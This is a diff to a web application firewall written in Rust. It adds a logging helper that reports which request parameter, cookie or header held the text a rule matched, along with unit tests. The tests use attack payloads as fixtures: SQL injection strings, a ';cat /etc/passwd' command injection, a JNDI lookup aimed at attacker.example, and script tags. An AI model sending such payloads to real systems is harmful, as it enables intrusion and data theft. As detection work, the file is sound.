@@ -2463,6 +2463,303 @@ fn pop_numeric_f64(stack: &mut Vec<StackVal>) -> f64 {
 }
 
 // ---------------------------------------------------------------------------
+// Match location — which parameter held the matched text (for logging only)
+// ---------------------------------------------------------------------------
+
+/// The named values of one request, labelled the way a ModSecurity exclusion
+/// names them (`ARGS:q`, `REQUEST_COOKIES:lang`, `REQUEST_HEADERS:x-api-version`).
+///
+/// A RuleMatch records the COLLECTION a rule read (`ARGS`), or nothing when the
+/// rule read several (`ARGS|REQUEST_HEADERS|…` — every 99001xx all-placement
+/// signature). Either way the event never named the parameter, which is the one
+/// thing an operator needs to judge a false positive or scope an exclusion. F5
+/// and BunkerWeb both show it.
+///
+/// Built once per LOGGED request, by the logger, from the same parsers the VM
+/// uses — never on the evaluation path, so detection cost is unchanged.
+pub struct RequestValues {
+    entries: Vec<(Collection, String, String)>,
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Collection {
+    ArgsGet,
+    ArgsPost,
+    ArgsNames,
+    Cookies,
+    Headers,
+    Filename,
+    Body,
+}
+
+impl RequestValues {
+    /// Parse the request only if some match can use it: one whose target is not
+    /// already exact and that captured text to look for. The logger calls this
+    /// for every logged record — on a site reached by IP address that is every
+    /// request (920350 on the Host header, already exact) — and re-parsing a
+    /// large JSON body there would be pure waste.
+    pub fn for_matches(ctx: &RequestContext) -> Self {
+        let useful = ctx
+            .rule_matches
+            .iter()
+            .any(|m| !m.target.contains(':') && !m.matched_value.is_empty());
+        if useful {
+            Self::from_ctx(ctx)
+        } else {
+            Self {
+                entries: Vec::new(),
+            }
+        }
+    }
+
+    pub fn from_ctx(ctx: &RequestContext) -> Self {
+        let mut entries = Vec::new();
+        for (k, v) in parse_query_params(ctx.uri.query().unwrap_or("")) {
+            entries.push((Collection::ArgsNames, format!("ARGS_NAMES:{k}"), k.clone()));
+            entries.push((Collection::ArgsGet, format!("ARGS:{k}"), v));
+        }
+        let body = body_args(ctx);
+        let body_parsed = !body.is_empty();
+        for (k, v) in body {
+            if !k.is_empty() {
+                entries.push((Collection::ArgsNames, format!("ARGS_NAMES:{k}"), k.clone()));
+            }
+            let label = if k.is_empty() {
+                "REQUEST_BODY".to_string()
+            } else {
+                format!("ARGS:{k}")
+            };
+            entries.push((Collection::ArgsPost, label, v));
+        }
+        if let Some(c) = ctx
+            .request_headers
+            .get("cookie")
+            .and_then(|v| v.to_str().ok())
+        {
+            for (k, v) in parse_cookies(c) {
+                entries.push((Collection::Cookies, format!("REQUEST_COOKIES:{k}"), v));
+            }
+        }
+        for (name, value) in ctx.request_headers.iter() {
+            if let Ok(v) = value.to_str() {
+                entries.push((
+                    Collection::Headers,
+                    format!("REQUEST_HEADERS:{}", name.as_str()),
+                    v.to_owned(),
+                ));
+            }
+        }
+        entries.push((
+            Collection::Filename,
+            "REQUEST_FILENAME".to_string(),
+            percent_decode(ctx.uri.path()),
+        ));
+        // The raw body only when no parser claimed it: a parsed body is already
+        // listed field by field, and listing it twice would make every body
+        // match "ambiguous".
+        if !body_parsed {
+            if let Some(b) = ctx.request_body.as_ref() {
+                entries.push((
+                    Collection::Body,
+                    "REQUEST_BODY".to_string(),
+                    String::from_utf8_lossy(b).into_owned(),
+                ));
+            }
+        }
+        Self { entries }
+    }
+
+    /// Name the one place `matched` sits, within what `rule_target` says the
+    /// rule read — or `None` when that is not certain.
+    ///
+    /// Certainty is the whole contract: naming the wrong parameter sends an
+    /// operator to write an exclusion against a field that never fired. So a
+    /// label is returned only when EXACTLY ONE location contains the text:
+    /// - `rule_target` a specific member (`REQUEST_HEADERS:User-Agent`) is
+    ///   already exact and is returned unchanged;
+    /// - a collection (`ARGS`, `REQUEST_COOKIES`, …) is refined within it;
+    /// - empty (the rule read several collections) searches all of them, minus
+    ///   `Cookie` and `Referer`, which only repeat values listed elsewhere.
+    ///
+    /// The comparison is case-insensitive over collapsed whitespace, because
+    /// the matched text is post-transform (lowercased, decoded) while the listed
+    /// values are as parsed.
+    pub fn locate(&self, rule_target: &str, matched: &str) -> Option<String> {
+        if rule_target.contains(':') {
+            return Some(rule_target.to_string());
+        }
+        let needle = normalize_for_locate(matched);
+        if needle.is_empty() || needle.starts_with("[redacted") {
+            return None;
+        }
+        let allowed: &[Collection] = match rule_target {
+            "" => &[
+                Collection::ArgsGet,
+                Collection::ArgsPost,
+                Collection::Cookies,
+                Collection::Headers,
+                Collection::Filename,
+                Collection::Body,
+            ],
+            "ARGS" => &[Collection::ArgsGet, Collection::ArgsPost],
+            "ARGS_GET" | "QUERY_STRING" => &[Collection::ArgsGet],
+            "ARGS_NAMES" | "ARGS_GET_NAMES" => &[Collection::ArgsNames],
+            "REQUEST_COOKIES" => &[Collection::Cookies],
+            "REQUEST_HEADERS" => &[Collection::Headers],
+            "REQUEST_FILENAME" => return Some(rule_target.to_string()),
+            _ => return None,
+        };
+        let multi = rule_target.is_empty();
+        let mut found: Option<&str> = None;
+        for (coll, label, value) in &self.entries {
+            if !allowed.contains(coll) {
+                continue;
+            }
+            if multi
+                && *coll == Collection::Headers
+                && (label == "REQUEST_HEADERS:cookie" || label == "REQUEST_HEADERS:referer")
+            {
+                continue;
+            }
+            if normalize_for_locate(value).contains(&needle) {
+                match found {
+                    None => found = Some(label.as_str()),
+                    Some(prev) if prev == label.as_str() => {}
+                    Some(_) => return None, // two places — not certain
+                }
+            }
+        }
+        found.map(str::to_string)
+    }
+}
+
+fn normalize_for_locate(s: &str) -> String {
+    s.split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_lowercase()
+}
+
+#[cfg(test)]
+mod locate_tests {
+    use super::*;
+    use std::net::{IpAddr, Ipv4Addr};
+
+    fn ctx(uri: &str) -> RequestContext {
+        let mut c = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1);
+        c.uri = uri.parse().unwrap();
+        c
+    }
+
+    #[test]
+    fn names_the_query_parameter_a_multi_target_rule_matched() {
+        // The 2026-09-24 case: 9900100 read several collections, so the event
+        // said target="" for a UNION payload that was plainly in ?q=.
+        let c = ctx(
+            "/rest/products/search?q=%27))%20UNION%20SELECT%20id,email%20FROM%20Users--&lang=en",
+        );
+        let v = RequestValues::from_ctx(&c);
+        assert_eq!(
+            v.locate("", "')) UNION SELECT id,email FROM Users--")
+                .as_deref(),
+            Some("ARGS:q")
+        );
+        // Post-transform text (lowercased) still finds it.
+        assert_eq!(
+            v.locate("", "')) union select id,email from users--")
+                .as_deref(),
+            Some("ARGS:q")
+        );
+    }
+
+    #[test]
+    fn refines_a_collection_label_to_the_member() {
+        let c = ctx("/x?a=1&cmd=;cat%20/etc/passwd");
+        let v = RequestValues::from_ctx(&c);
+        assert_eq!(
+            v.locate("ARGS", ";cat /etc/passwd").as_deref(),
+            Some("ARGS:cmd")
+        );
+    }
+
+    #[test]
+    fn names_a_json_body_field() {
+        let mut c = ctx("/rest/user/login");
+        c.request_headers
+            .insert("content-type", "application/json".parse().unwrap());
+        c.request_body = Some(br#"{"email":"' OR 1=1--","password":"x"}"#.to_vec().into());
+        let v = RequestValues::from_ctx(&c);
+        assert_eq!(v.locate("", "' OR 1=1--").as_deref(), Some("ARGS:email"));
+    }
+
+    #[test]
+    fn names_a_header() {
+        let mut c = ctx("/rest/products/search?q=apple");
+        c.request_headers.insert(
+            "x-api-version",
+            "${jndi:ldap://attacker.example/a}".parse().unwrap(),
+        );
+        let v = RequestValues::from_ctx(&c);
+        assert_eq!(
+            v.locate("", "${jndi").as_deref(),
+            Some("REQUEST_HEADERS:x-api-version")
+        );
+    }
+
+    #[test]
+    fn refuses_to_guess_when_the_text_is_in_two_places() {
+        let c = ctx("/x?a=%3Cscript%3E&b=%3Cscript%3E");
+        let v = RequestValues::from_ctx(&c);
+        assert_eq!(v.locate("", "<script>"), None);
+        assert_eq!(v.locate("ARGS", "<script>"), None);
+    }
+
+    #[test]
+    fn a_referer_repeating_the_payload_does_not_make_it_ambiguous() {
+        let mut c = ctx("/x?q=%3Cscript%3E");
+        c.request_headers
+            .insert("referer", "http://site/x?q=<script>".parse().unwrap());
+        let v = RequestValues::from_ctx(&c);
+        assert_eq!(v.locate("", "<script>").as_deref(), Some("ARGS:q"));
+    }
+
+    #[test]
+    fn parses_nothing_when_no_match_needs_locating() {
+        let mut c = ctx("/x?q=%3Cscript%3E");
+        c.rule_matches.push(RuleMatch {
+            rule_id: "920350".into(),
+            message: "Host header is a numeric IP address".into(),
+            severity: Severity::Notice,
+            score: 3,
+            target: "REQUEST_HEADERS:Host".into(),
+            phase: Phase::RequestHeaders,
+            matched_value: "172.16.21.71".into(),
+        });
+        assert!(RequestValues::for_matches(&c).entries.is_empty());
+        c.rule_matches[0].target = "ARGS".into();
+        c.rule_matches[0].matched_value = "<script>".into();
+        assert!(!RequestValues::for_matches(&c).entries.is_empty());
+    }
+
+    #[test]
+    fn keeps_an_exact_target_and_never_invents_one() {
+        let v = RequestValues::from_ctx(&ctx("/x?q=1"));
+        assert_eq!(
+            v.locate("REQUEST_HEADERS:User-Agent", "sqlmap").as_deref(),
+            Some("REQUEST_HEADERS:User-Agent")
+        );
+        assert_eq!(v.locate("", ""), None, "no matched text, no location");
+        assert_eq!(v.locate("", "[redacted: sensitive field]"), None);
+        assert_eq!(v.locate("", "not-in-the-request"), None);
+        assert_eq!(
+            v.locate("RESPONSE_BODY", "x"),
+            None,
+            "outside what we can map"
+        );
+    }
+}
+
+// ---------------------------------------------------------------------------
 // XML / SOAP body extraction tests
 // ---------------------------------------------------------------------------
 
